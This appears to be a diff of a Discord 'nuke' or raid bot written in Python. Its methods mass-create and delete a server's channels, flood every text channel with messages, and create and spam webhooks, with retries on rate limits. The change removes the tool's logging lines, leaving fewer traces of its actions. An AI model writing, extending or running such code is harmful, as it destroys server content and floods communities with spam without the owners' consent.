@@ -1,10 +1,10 @@
 from __future__ import annotations
 import asyncio
 import base64
-import logging
 import os
 import random
 from typing import Optional
+import logging
 
 import aiohttp
 import discord
@@ -35,7 +35,6 @@ async def _create_webhook(session: aiohttp.ClientSession, limiter: AsyncLimiter,
                         if res.status == 429:
                             data = await res.json()
                             retry_after = float(data.get("retry_after", 1.0))
-                            logging.warning(f"wh create 429 retry={retry_after:.1f}s")
                             await asyncio.sleep(retry_after + 0.1)
                             continue
                         if res.status >= 500 and attempt < 2:
@@ -108,7 +107,6 @@ class Operations:
         self.session = aiohttp.ClientSession(headers={"Authorization": f"Bot {self.token}"})
         rps = max(1, self.settings.requests_per_second)
         self.limiter = AsyncLimiter(rps + 1, 1.0185)
-        logging.info(f"[ops] token={'set' if self.token else 'MISSING'} rps={rps}")
 
     async def close(self):
         if self.session and not self.session.closed:
@@ -144,7 +142,6 @@ class Operations:
             url = f"{API}/guilds/{guild.id}/channels"
             items.append((url, {"name": name, "type": 0}))
         ok = await _run_batched(items, "POST", self.session, self.limiter)
-        logging.info(f"[CrChannel] {ok}/{count}")
         return ok
 
     async def DelChannels(self, guild: discord.Guild) -> int:
@@ -153,7 +150,6 @@ class Operations:
             return 0
         items = [(f"{API}/channels/{cid}", None) for cid in channel_ids]
         ok = await _run_batched(items, "DELETE", self.session, self.limiter)
-        logging.info(f"[DelChannels] {ok}/{len(channel_ids)}")
         return ok
 
     async def spam(self, guild: discord.Guild) -> int:
@@ -169,7 +165,6 @@ class Operations:
             for channel in text_channels:
                 items.append((f"{API}/channels/{channel.id}/messages", payload))
         ok = await _run_batched(items, "POST", self.session, self.limiter)
-        logging.info(f"[spam] {ok}")
         return ok
 
     async def mess_server(self, guild: discord.Guild) -> None:
@@ -261,8 +256,6 @@ class Operations:
             logging.info(f"[spam_webhook] no webhooks created")
             return 0
 
-        logging.info(f"[spam_webhook] created {len(valid)} webhooks")
-
         # spam webhooks
         items = []
         for _ in range(self.settings.webhook_count):
@@ -279,6 +272,4 @@ class Operations:
             results = await asyncio.gather(*tasks, return_exceptions=True)
             ok += sum(1 for r in results if not isinstance(r, Exception))
             await asyncio.sleep(0.25)
-
-        logging.info(f"[spam_webhook] sent={ok}")
         return ok
